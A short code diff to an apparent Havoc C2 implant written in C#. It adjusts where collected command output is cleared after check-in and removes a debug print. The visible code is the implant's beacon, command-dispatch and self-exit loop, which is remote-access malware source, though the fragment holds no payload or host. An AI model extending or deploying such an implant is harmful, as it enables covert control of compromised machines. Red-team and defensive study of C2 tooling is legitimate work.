@@ -54,7 +54,7 @@ namespace HavocImplant
             {
                 Console.WriteLine($"Failed Checkins: {implant.timeoutCounter}");
                 string commands = implant.CheckIn(implant.outputData);
-                implant.outputData = "";
+                //implant.outputData = "";
                 if (commands.Length > 4)
                 {
                     string[] commandsArray = commands.Split(new string[] { commands.Substring(0, 4) }, StringSplitOptions.RemoveEmptyEntries);
@@ -80,7 +80,6 @@ namespace HavocImplant
                                 sleepThread.Start();
                                 break;
                         }
-                        Console.WriteLine("Output Data: {0}", implant.outputData);
                     }
                 }
                 Thread.Sleep(implant.sleepTime);
@@ -213,6 +212,7 @@ namespace HavocImplant
                     if (timeoutCounter == maxTries) Environment.Exit(Environment.ExitCode);
                 }
             }
+            outputData = "";
             return responseString;
         }
         static string getIPv4()
